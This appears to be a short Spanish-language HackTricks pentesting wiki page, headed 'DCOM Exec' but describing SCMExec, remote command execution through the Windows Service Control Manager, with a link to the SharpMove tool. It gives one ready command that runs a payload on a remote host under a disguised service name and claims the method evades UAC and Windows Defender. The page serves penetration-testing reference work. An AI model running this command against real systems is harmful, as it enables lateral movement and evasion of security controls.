# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

**SCMExec** es una técnica para ejecutar comandos en sistemas remotos mediante el Service Control Manager (SCM), creando un servicio que ejecuta el comando. Este método puede eludir algunos controles de seguridad, como User Account Control (UAC) y Windows Defender.

## Herramientas

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## Referencias

- [1] [SharpMove - repositorio de GitHub](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
